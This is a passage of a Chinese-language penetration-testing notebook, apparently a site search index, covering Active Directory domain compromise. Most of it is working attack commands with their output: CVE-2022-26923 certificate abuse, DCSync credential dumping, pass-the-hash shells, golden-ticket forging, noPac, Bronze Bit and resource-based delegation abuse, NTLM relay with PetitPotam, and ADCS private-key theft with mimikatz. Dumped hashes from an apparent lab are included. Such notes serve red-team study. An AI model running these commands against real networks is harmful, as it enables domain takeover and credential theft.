\u6211\u5728Linux\u4e0a\u6d4b\u8bd5\u65f6\uff0c\u5728\u83b7\u53d6tgt\u7684\u6b65\u9aa4\u51fa\u73b0\u4e86\u9519\u8bef\uff0c\u4f46\u662f\u91cd\u8bd5\u4e86\u51e0\u6b21\u53c8\u6210\u529f\u4e86\uff0c\u53ef\u80fd\u662f\u8fd8\u9700\u8981\u6307\u5b9adc\u3002 \u2514\u2500# certipy auth -pfx adcs1.pfx -ns 192.168.14.100 Certipy v3.0.0 - by Oliver Lyak (ly4k) [*] Using principal: adcs1@exp1.com [*] Trying to get TGT... [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) \u4f7f\u7528bloodyAD\u9a8c\u8bc1\u57df\u7528\u6237\u662f\u5426\u80fd\u6dfb\u52a0\u673a\u5668\uff0cbloodyAD\u652f\u6301hash \u2514\u2500# python3 bloodyAD.py -d INTRA.a.com -u admin -p 'acbcdefg.' --host 192.168.14.100 getObjectAttributes 'DC=exp1,DC=com' ms-DS-MachineAccountQuota 1 \u2a2f { \"ms-DS-MachineAccountQuota\": 10 } \u521b\u5efa\u4e00\u4e2a\u673a\u5668 \u2514\u2500# python3 bloodyAD.py -d exp1.com -u adcs1 -p 'Aa123123' --host 192.168.14.100 addComputer 525 'Aa525525' Opening domain EXP1... Successfully added machine account 525$ with password Aa525525. addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@' \u83b7\u53d6\u57df\u63a7\u7684dNSHostName python3 bloodyAD.py -d exp1.com -u adcs1 -p 'Aa123123' --host 192.168.14.100 getObjectAttributes 'CN=dc,ou=domain controllers,DC=exp1,DC=com' dNSHostName \u5c06\u521b\u5efa\u673a\u5668\u7684dNSHostName\u4fee\u6539\u6210\u57df\u63a7\u7684 \u2514\u2500# python3 bloodyAD.py -d exp1.com -u adcs1 -p 'Aa123123' --host 192.168.14.100 setAttribute 'CN=525,CN=Computers,DC=exp1,DC=com' dNSHostName '[\"dc.exp1.com\"]' dNSHostName set successfully \u67e5\u8be2525\u673a\u5668\u7684dnshostname\u53ef\u77e5\u5df2\u7ecf\u4fee\u6539\u6210\u529f\u4e86 \u2514\u2500# python3 bloodyAD.py -d exp1.com -u adcs1 -p 'Aa123123' --host 192.168.14.100 getObjectAttributes 'CN=525,cn=computers,DC=exp1,DC=com' dNSHostName { \"dNSHostName\": \"dc.exp1.com\" } \u4e3a525\u7533\u8bf7\u4e00\u4e2a\u8bc1\u4e66 \u2514\u2500# certipy req 'exp1.com/525$:Aa525525@192.168.14.100' -template Machine -dc-ip 192.168.14.100 -ca exp1-dc-CA Certipy v3.0.0 - by Oliver Lyak (ly4k) [*] Requesting certificate [*] Successfully requested certificate [*] Request ID is 48 [*] Got certificate with DNS Host Name 'dc.exp1.com' [*] Certificate object SID is None [*] Saved certificate and private key to 'dc.pfx' \u4f7f\u7528\u8bc1\u4e66\u83b7\u53d6tgt\uff0c\u4e5f\u53ef\u4ee5\u7528rubeus\u3001keko\u83b7\u53d6\u3002 \u2514\u2500# certipy auth -pfx dc.pfx -dc-ip 192.168.14.100 -ns 192.168.14.100 1 \u2a2f Certipy v3.0.0 - by Oliver Lyak (ly4k) [*] Using principal: dc$@exp1.com [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'dc.ccache' [*] Trying to retrieve NT hash for 'dc$' [*] Got NT hash for 'dc$@exp1.com': cc58bff8a6749646e92b603033bcbef7 \u62ff\u57df\u63a7\u673a\u5668\u7528\u6237hash dcsync \u2514\u2500# secretsdump.py exp1.com/dc\\$@192.168.14.100 -hashes :cc58bff8a6749646e92b603033bcbef7 -just-dc -just-dc-user administrator Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:0baecfec3a6898d4ac4df0977107d32e::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:fe02efc0d157faaad39ca3fed88044b1f0ca41eef9cc47a6df22c6795a8e3f96 Administrator:aes128-cts-hmac-sha1-96:b8f016f2b435595558d605103dd25a10 Administrator:des-cbc-md5:4a9ddc0e9186983d [*] Cleaning up... PTH\u4e00\u4e0b\u770b\u770b \u2514\u2500# wmiexec.py exp1/administrator@192.168.14.100 -hashes :0baecfec3a6898d4ac4df0977107d32e 1 \u2a2f Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\>whoami exp1\\administrator","title":"\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_50","text":"\u5f53\u51fa\u73b0\u4e0b\u9762\u9519\u8bef\u800c\u4e0d\u80fd\u5f97\u5230\u89e3\u51b3\u65f6\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u91cc\u7684\u529e\u6cd5\u3002 \u6211\u5728\u672c\u5730\u5c1d\u8bd5\u65f6\u5931\u8d25\u4e86\uff0c\u7136\u540e\u57df\u63a7\u5d29\u4e86\u91cd\u542f\u4e86\uff0c\u771f\u5b9e\u73af\u5883\u4e2d\u4e0d\u8981\u8fd9\u6837\u6253\u3002 bloodyAD and CVE-2022-26923 | Total Recall [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)` \u7b80\u800c\u8a00\u4e4b\u662f\u5728\u5229\u7528\u8bc1\u4e66\u7533\u8bf7tgt\u7684\u6b65\u9aa4\u6539\u4e3a\u4ee5\u4e0b \u5c1d\u8bd5\u4f7f\u7528\u8bc1\u4e66\u8bbe\u7f6e\u65b0\u589e\u673a\u5668\u5230\u57df\u63a7\u7684\u59d4\u6d3e > openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes > python bloodyAD.py -d crashlab.local -c \":crashdc.pem\" -u 'cve$' --host 10.100.10.12 setRbcd 'CVE$' 'CRASHDC$' [+] CVE$ SID is: S-1-5-21-1945936656-2616711065-1665664270-1134 [+] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity correctly set [+] Delegation rights modified successfully! CVE$ can now impersonate users on CRASHDC$ via S4U2Proxy \u59d4\u6d3e\u653b\u51fb > getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*' Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Getting TGT for user [*] Impersonating emacron [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in emacron.ccache > cp emacron.ccache /tmp/ > export KRB5CCNAME=/tmp/emacron.ccache \u8fd9\u6837\u5c31\u83b7\u5f97\u4e86tgt","title":"\u5f02\u5e38\u60c5\u51b5\u5904\u7406\uff08\u614e\u7528\uff09"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#cve-2021-42287cve-2021-42278","text":"\u5728\u6709\u666e\u901a\u57df\u7528\u6237\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u6253\u57df\u3002 \u5229\u7528\u6f0f\u6d1e\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u7528\u6237\uff0c\u518d\u5c06\u673a\u5668\u7528\u6237\u7684sAMAccountName\u6539\u6210\u771f\u57df\u63a7\u7684\u540d\u79f0\uff0c\u518d\u7528\u8fd9\u4e2a\u5047\u57df\u63a7\u53bb\u7533\u8bf7\u4e00\u4e2atgt\uff0c\u7533\u8bf7\u540esAMAccountName\u6539\u56de\u539f\u6765\u7684\u3002\u6b64\u65f6\u62ff\u7740tgt\u53bb\u8bf7\u6c42s4u2self\uff0c\u8fd9\u65f6KDC\u4f1a\u81ea\u52a8\u641c\u7d22\u5230\u771f\u57df\u63a7\uff0c\u5c31\u4f1a\u62ff\u5230\u771f\u57df\u63a7\u7684\u670d\u52a1\u5668\u7968\u636eST\u3002","title":"CVE-2021-42287/CVE-2021-42278"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_51","text":"","title":"\u56de\u8f66\u5373\u79d2"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dcsync_1","text":"\u4fee\u6539\u5229\u7528\u65b9\u5f0fcifs\u4e3aldap\u4ee5\u4fbf\u6765dcsync \u76ee\u524d\u5de5\u5177\u4ec5\u652f\u6301\u660e\u6587\u5bc6\u7801\u3002\u6ca1\u6709\u660e\u6587\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u6253\u4e0b\u4e00\u53f0\u57df\u5185\u673a\u5668\uff0c\u4e0d\u7528-user\u548c-pass\u53c2\u6570\u4e5f\u53ef\u4ee5","title":"dcsync"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_52","text":"\u5229\u7528krbtgt\u7528\u6237\u751f\u6210\u4efb\u610f\u7528\u6237\u7968\u636e\uff0c\u4ee5\u4e0b\u76f4\u63a5\u751f\u6210\u57df\u7ba1\u7968\u636e lsadump::dcsync /domain:exp1.com /user:krbtgt kerberos::golden /admin:administrator /domain:exp1.com /sid:S-1-5-21-3280894980-4031048059-2076154112 /krbtgt:0d0b0ca11c57aaedb47b02f023b636a1 /ticket:yuguan.tck","title":"\u751f\u6210\u9ec4\u91d1\u7968\u636e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#rdp","text":"\u6709\u4e2a\u5f88\u597d\u7528\u7684\u5de5\u5177\u62ffshell\uff0c\u5f53\u7136dcsync\u4e4b\u540e\u624b\u52a8pth\u4e5f\u662f\u53ef\u4ee5\u7684 https://github.com/WazeHell/sam-the-admin python3 sam_the_admin.py \"exp/admin:123456\" -dc-ip 10.1.1.1 -shell shell\u641e\u5b8c\u76f4\u63a5\u6dfb\u52a0\u4e00\u4e2a\u57df\u7ba1\u8d26\u53f7rdp\u4e0a\u53bb","title":"rdp\u57df\u63a7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#kerberos-bronze-bit-attack","text":"","title":"Kerberos Bronze Bit Attack"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_53","text":"\u8fd9\u91cc\u601d\u8def\u662f\u627e\u5230\u975e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673aS1\uff0c\u518d\u5229\u7528\u8d26\u6237\u5411DC\u8bf7\u6c42\u7968\u636e\uff0c\u6700\u540e\u62ff\u7740\u7968\u636e\u653b\u51fbS2 1\uff09\u627e\u5230\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u7684\u59d4\u6d3e\u7684\u8d26\u6237\u548c\u4e3b\u673a \u901a\u8fc7\u547d\u4ee4\u67e5\u627e 2\uff09\u62ff\u4e0b\u6743\u9650 3\uff09\u5c1d\u8bd5Kerberos Bronze Bit Attack runas /user:PC\\administrator mimikatz privilege::debug sekurlsa::ekeys 4\uff09\u8bf7\u6c42\u7968\u636e python3 getST.py -spn cifs/Service2.test.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:aa09cecb1728cd5cad6e779c7f370563 -aesKey 71f9caf9203575bbbe760e6a669d90cbe39be0b5a442496295e2f63990ee858f exp.com/PC -force-forwardable 5\uff09PTT\u653b\u51fb export KRB5CCNAME=xx.krb psexec.py exp.com/cs@dc.exp.com -k -no-pass PC.exp.com","title":"\u7ea6\u675f\u59d4\u6d3e\u7ed5\u8fc7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_54","text":"\u8fd9\u91cc\u601d\u8def\u662f\u5148\u62ff\u4e0b\u4e00\u4e2aS1\uff0c\u7136\u540e\u5229\u7528\u7279\u6743\u65b0\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u518d\u5229\u7528Microsoft.ActiveDirectory.Management.dll\u6dfb\u52a0\u673a\u5668\u7528\u6237\u4e0eS2\u7684\u4fe1\u4efb\u5173\u7cfb\uff0c\u518d\u6a21\u62df\u673a\u5668\u7528\u6237\u5411DC\u7533\u8bf7\u7968\u636e\uff0c\u6700\u540e\u901a\u8fc7\u7968\u636e\u767b\u5f55S2\u3002 1\uff09\u9996\u5148\u9700\u8981\u901a\u8fc7powermad\u65b0\u52a0\u5165\u4e00\u4e2a\u8ba1\u7b97\u673a\u8d26\u6237AttackerService\uff0c\u5bc6\u7801\u4e3aAttackerServicePassword\uff0c\u7528\u57df\u8d26\u6237jack\u767b\u5f55service1\u3002 \u6ce8\uff1a\u8fd9\u4e2apowermad\u5de5\u5177\u4e0d\u4ec5\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u7279\u6743\u6dfb\u52a0\u673a\u5668\u8d26\u6237\uff0c\u8fd8\u53ef\u4ee5\u6dfb\u52a0NS\u89e3\u6790\u8bb0\u5f55\u3002NS\u89e3\u6790\u8bb0\u5f55\u53ef\u7528\u4e8eHTTP\u7684NTLM RELAY\u3002 Import-Module .\\Powermad\\powermad.ps1 New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force) 2\uff09\u7136\u540e\u4f7f\u7528PowerShell Active Directory\u6a21\u5757\u6dfb\u52a0\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\uff0c\u5373\u4eceAttackerService\u5230Service2\u7684\u4f20\u5165\u4fe1\u4efb\u5173\u7cfb\u3002 Import-Module .\\Microsoft.ActiveDirectory.Management.dll Get-ADComputer AttackerService #\u786e\u8ba4\u673a\u5668\u8d26\u6237\u5df2\u7ecf\u88ab\u6dfb\u52a0 Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount 3\uff09\u8bbe\u7f6e\u597d\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\u4e4b\u540e\u5c31\u53ef\u4ee5\u6a21\u62df\u7528\u6237\u7533\u8bf7\u7968\u636e\u4e86\u3002 hashes\u548caesKey\u53c2\u6570\u6765\u81ea\u4e8e\u6dfb\u52a0\u7684\u673a\u5668\u7528\u6237AttackerService\uff0cmimikatz\u53ef\u4ee5\u8ba1\u7b97 kerberos::hash /password:AttackerServicePassword /user:AttackerService python3 getST.py -spn cifs/Service2.test.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardable 4\uff09PTT\u653b\u51fb export KRB5CCNAME=xx.krb psexec.py exp.com/cs@dc.exp.com -k -no-pass PC.exp.com","title":"\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u7ed5\u8fc7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#spn_1","text":"https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/ \u5f53\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u653b\u51fb\u4e2d\u65e0\u6743\u9650\u4e3a\u6dfb\u52a0\u7684\u670d\u52a1\u8bbe\u7f6e\u59d4\u6d3e\u65f6\uff0c\u5f53\u8bbe\u7f6e\u4e86\u5bf9SPN\u7684\u59d4\u6d3e\u65f6\uff0c\u53ef\u4ee5\u5229\u7528\u6b64\u65b9\u5f0f\u3002 \u5229\u7528\u65b9\u5f0f\uff1a PowerView\u67e5\u770b\u662f\u5426\u5b58\u5728SPN\u59d4\u6d3e Get-DomainComputer iis -Properties 'msds-allowedtodelegateto' \u7ed9\u76ee\u6807\u8bbe\u7f6e\u4e00\u4e2a\u540c\u6837\u7684SPN\uff08\u9700\u8981\u6709\u6743\u9650\uff09 Set-DomainObject -Identity target$ -Set @{serviceprincipalname='spn/name'} S4U\u653b\u51fb Rubeus s4u /domain:exp1.com /user:target$ /rc4:xxxxxxxxxxxxxxxx /impersonateuser:administrator /msdsspn:\"spn/name\" /nowrap","title":"\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u7ed5\u8fc7\u4e4bSPN\u52ab\u6301"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ms16-075","text":"potato\u7cfb\u5217\uff0c\u901a\u8fc7http\u534f\u8baerelay\uff0c\u518d\u53cd\u5c04\u56de\u7ed9\u672c\u673a\u7684smb\u534f\u8bae\u3002\u7528\u4f5c\u63d0\u6743","title":"MS16-075"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#cve-2018-8581","text":"exchange ssrf\u6f0f\u6d1e 1\uff09\u4f7f\u7528impacket\u76d1\u542c\u7aef\u53e3\u8fdb\u884c\u7b49\u5f85\u8fde\u63a5 ntlmrelayx.py -t ldap://10.0.2.254 --no-dump -no-da -escalate-user cs 2\uff09\u53d1\u8d77\u63a8\u9001\u8ba2\u9605\u6307\u5b9a\u6240\u9700\u7684URL\uff0cExchange \u670d\u52a1\u5668\u5c06\u5c1d\u8bd5\u5411\u8fd9\u4e2aURL\u53d1\u9001\u901a\u77e5 privexchange.py -ah 10.0.2.4 owa2010sp3.exp.com -u sqladmin -p 123456 -d exp -ev 2010_SP1 3\uff09relay\u5230\u57df\u63a7\u7684ldap\u670d\u52a1\u5668\u4f1a\u81ea\u52a8\u7ed9\u666e\u901a\u7528\u6237\u6dfb\u52a0\u4e24\u53f0ACL 4\uff09dcync secretdump.py exp.com/cs:123456@OWA2010SP3.exp.com -dc-ip 10.0.2.253 -just-dc-user administrator","title":"CVE-2018-8581"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#cve-2019-1040","text":"smb\u9700\u8981\u7b7e\u540d\u7684MIC\u9632\u62a4\u7ed5\u8fc7\u3002 \u5728\u653b\u51fb\u673a\u8d77\u4e00\u4e2a\u76d1\u542c\uff0c\u5c06\u63a5\u6536\u7684smb\u6307\u5b9a\u4e2d\u7ee7\u5230ldap\u534f\u8bae\uff0c\u6700\u7ec8\u653b\u51fb\u76ee\u6807\u662fDC2\uff1b\u4f7f\u7528\u6253\u5370\u673a\u6f0f\u6d1e\u6216PetitPotam\u653b\u51fbDC1\uff0c\u4f7f\u5176\u5f3a\u5236\u8ba4\u8bc1\u5230\u653b\u51fb\u673a\uff0c\u653b\u51fb\u673a\u518d\u5c06NTLM\u4e2d\u7ee7\u5230DC2\u7684ldap\u534f\u8bae 1\uff09\u57df\u63a7\u6253\u6cd5 \u4f7f\u7528impacket\u76d1\u542c445\u8fdb\u884c\u7b49\u5f85\u57df\u63a7\u8fdb\u884c\u8fde\u63a5 ntlmrelayx.py -t ldap://192.168.52.100 --escalate-user test1\\$ --remove-mic --no-dump -smb2support \u4f7f\u7528\u6253\u5370\u673a\u6f0f\u6d1e\u8ba9\u57df\u63a7\u8fde\u63a5\u6211\u4eec\u7684445(\u6ce8\u610f\u653b\u51fb\u7684\u57df\u63a7\u8ddf\u56de\u8fde\u7684LDAP\u6240\u5728\u7684\u670d\u52a1\u5668\u4e0d\u8981\u5728\u540c\u4e00\u53f0\u57df\u63a7) printerbug.py exp.com/cs:123456@10.0.2.4 10.0.2.5 \u4f7f\u7528PetitPotam\u8ba9DC1\u8fde\u63a5\u653b\u51fb\u673a\u7684445\uff0c\u5e76\u4e2d\u7ee7\u5230DC2\u7684ldap python Petitpotam.py 192.168.52.100 192.168.52.129 \u53d1\u8d77win7$\u5230dc2012\u7684s4u\uff0c\u901a\u8fc7-impersonate\u53c2\u6570\u6a21\u62dfDC1\u7528\u6237administrator\u7684\u7968\u8bc1 getST.py exp.com/win7\\$ -dc-ip 10.0.2.254 -spn cifs/dc2012r2.exp.com -hashes xxxx -impersonate administrator \u4f7f\u7528administrator\u7528\u6237\u7684\u7968\u636e\u767b\u5f55\u57df\u63a7psexec\uff0c\u5bfc\u5165\u51ed\u8bc1 export KRB5CCNAME=administrator.ccache psexec.py exp1.com/administrator@dc1.exp1.com -dc-ip 192.168.52.110 -k -no-pass 2\uff09exchange\u6253\u6cd5 \u89c1exchange\u653b\u51fb\u9762","title":"CVE-2019-1040"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#cve-2019-1384","text":"\u8fd9\u4e2a\u662f\u7ed5\u8fc7MS08-068\uff0c\u901a\u8fc7\u8d85\u65f6\u53d1\u9001type3 https://shenaniganslabs.io/files/impacket-ghostpotato.zip","title":"CVE-2019-1384"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_55","text":"\u5728\u591a\u57df\u73af\u5883\u4e2d\u53ea\u6709\u4e00\u4e2aEnterprise Admins\u7ec4\uff0c\u8be5\u7ec4\u662f\u6839\u57df\u7684\u7ba1\u7406\u5458\u7ec4\uff0c\u4e0d\u5b58\u5728\u4e8e\u5b50\u57df\u3002 \u83b7\u53d6\u5b50\u57dfSID\u548c\u5b50\u57dfkrbtgt\u7528\u6237\u7684SID\u3002 \u83b7\u53d6\u6839\u57df\u7684SID\uff0c\u4ee5\u4fbf\u7ec4\u5408\u51faEnterprise Admins\u7ec4\u7684SID\u3002 \u5e38\u89c1\u7ec4SID\u5982\u4e0b\uff1aDomain Admins\uff08S-1-5-domain-512\uff09\u3001Domain Users\uff08S-1-5-domain-513\uff09\u3001Administrator\uff08S-1-5-domain-500\uff09\u3001Enterprise Admins\uff08S-1-5-root domain-519\uff09\u3001Domain Admins\uff08S-1-5-domain-515\uff09 \u4f2a\u9020\u4e00\u4e2aSID History\u7684\u503c\u4e3aEnterprise Admins\u7684SID\u7684\u9ec4\u91d1\u7968\u636e\uff0c\u4fbf\u53ef\u5229\u7528\u8be5\u7968\u636e\u5229\u7528\u7684SID History\u6765\u5192\u5145Enterprise Admins\u7684\u7ec4\u6210\u5458\u3002","title":"\u57df\u4fe1\u4efb\u95f4\u7684\u6a2a\u5411"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_56","text":"\u90fd\u53ef\u4ee5\u7528 nltest /domain_trusts mimikatz.exe \"lsadump::trust /patch","title":"\u57df\u4fe1\u4efb\u67e5\u8be2"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#sid","text":"mimkatz\u67e5\u8be2\uff08\u67e5\u8be2\u5b50\u57df\u548c\u6839\u57df\u7684\uff09 mimikatz.exe \"lsadump::trust /patch\" powershell\u67e5\u8be2 \u67e5\u8be2\u5b50\u57df\u7684 shell powershell -ExecutionPolicy bypass -command \"&{import-module C:\\Users\\Public\\PowerView.ps1; Get-DomainSID}\" \u67e5\u8be2\u6839\u57df\u7684 shell powershell -ExecutionPolicy bypass -command \"&{import-module C:\\Users\\Public\\PowerView.ps1; Convert-NameToSid exp\\krbtgt}\"","title":"SID\u67e5\u8be2"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_57","text":"\u6807\u51c6 kerberos::golden /user:administrator /domain: /sid: /krbtgt:<KRBTGT_HASH> /sids:-519 /ptt SIDS\u662fEnterprise Admins\u7ec4\u7684SID\uff0cSID\u548chash\u662f\u5b50\u57df\u7684\u4fe1\u606f","title":"\u751f\u6210\u7968\u636e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dcsync_2","text":"\u5f53\u7136\u4e5f\u53ef\u4ee5\u5bfc\u5b50\u57df lsadump::dcsync /domain:exp.com /all /csv","title":"dcsync\u76f4\u63a5\u5bfc\u6839\u57df"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_58","text":"\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u5bfc\u51fa\u7968\u636e sekurlsa::tickets /export","title":"\u5bfc\u51fa\u7968\u636e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#adcs","text":"","title":"ADCS\u5229\u7528\u9762"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#adcs_1","text":"certutil -dump -v","title":"\u67e5\u627eADCS\u670d\u52a1\u5668"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_59","text":"Certipy-main \u6574\u5408\u4e86ESC1-ESC8\u7684\u5229\u7528\uff0c\u8be6\u89c1Certipy-main\u6587\u4ef6\u5939\u4e0b\u7684readme certi-main\u4e5f\u6574\u5408\u4e86\u5229\u7528\uff0c\u8be6\u89c1readme ADCSKiller\u5305\u542bECS1\u548cECS8\u7684\u81ea\u52a8\u5316\u5229\u7528 https://github.com/grimlockx/ADCSKiller ADCSPwn\u5feb\u901fESC8\u5229\u7528","title":"\u5de5\u5177\u5316"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_60","text":"\u57df\u5185\u673a\u5668\u53ef\u4ee5\u4f7f\u7528 certmgr.msc (\u7528\u6237\u8bc1\u4e66)\uff0c certlm.msc (\u8ba1\u7b97\u673a\u8bc1\u4e66) GUI \u8bf7\u6c42\u8bc1\u4e66 \u547d\u4ee4\u5bfc\u51fa \u7528\u6237\u79c1\u94a5 certutil -user -store My mimikatz\u5f3a\u5236\u5bfc\u51fa\u5305\u542b\u79c1\u94a5\u7684\u673a\u5668\u8bc1\u4e66 privilege::debug crypto::capi crypto::certificates /systemstore:local_machine /store:my /export mimikatz\u5f3a\u5236\u5bfc\u51fa\u5305\u542b\u79c1\u94a5\u7684\u7528\u6237\u8bc1\u4e66 privilege::debug crypto::capi crypto::certificates /systemstore:CURRENT_USER /store:my /export","title":"\u7533\u8bf7\u8bc1\u4e66"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_61","text":"dir /s /b C: | findstr *.pfx | \u540e\u7f00 | \u63cf\u8ff0 | |:---------------------- |:---------------------------- | | .pfx\\ .p12\\ .pkcs12 | \u542b\u516c\u79c1\u94a5\uff0c\u901a\u5e38\u6709\u5bc6\u7801\u4fdd\u62a4 | | .pem | \u542b\u6709base64\u8bc1\u4e66\u53ca\u79c1\u94a5\uff0c\u53ef\u5229\u7528openssl\u683c\u5f0f\u8f6c\u5316 | | .key | \u53ea\u5305\u542b\u79c1\u94a5 | | .crt\\ .cer | \u53ea\u5305\u542b\u8bc1\u4e66 | | .csr | \u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42\u6587\u4ef6\uff0c\u4e0d\u542b\u6709\u516c\u79c1\u94a5 | | .jks\\ .keystore\\ .keys | \u53ef\u80fd\u542b\u6709 java \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u8bc1\u4e66\u548c\u79c1\u94a5 |","title":"\u641c\u7d22\u8bc1\u4e66"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#tgt","text":"\u4f7f\u7528PKINIT\u8ba4\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7X.509\u8bc1\u4e66\u83b7\u53d6tgt \u8fd9\u91cc\u7684\u8bc1\u4e66\u5fc5\u987b\u662f\u5305\u542b\u79c1\u94a5\u7684pfx\u683c\u5f0f\u7684\uff0c\u9700\u8981\u77e5\u9053\u8bc1\u4e66\u5bc6\u7801 rubeus.exe asktgt /user:iis /certificate:xxx.pfx /password:123123 \u8fd8\u53ef\u4ee5\u4f7f\u7528certipy\u83b7\u53d6\uff0c\u8be6\u89c1CVE-2022-26923\u3002","title":"\u901a\u8fc7\u8bc1\u4e66\u83b7\u53d6TGT"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ntlm","text":"\u9700\u8981\u7279\u5b9a\u6a21\u677f\u53ca\u7528\u6237\u6743\u9650 kekeo tgt::pac /subject:iis /castore:current_user","title":"\u901a\u8fc7\u8bc1\u4e66\u83b7\u53d6\u7528\u6237NTLM"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#-esc1","text":"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6ee5\u7528 \u4f7f\u7528 Certify.exe find /vulnerable \u6765\u53d1\u73b0\u5b58\u5728\u53ef\u5229\u7528\u7684\u8bc1\u4e66\u6a21\u677f \u4f7f\u7528 certutil.exe -TCAInfo \u67e5\u8be2CA\u72b6\u6001\u3002 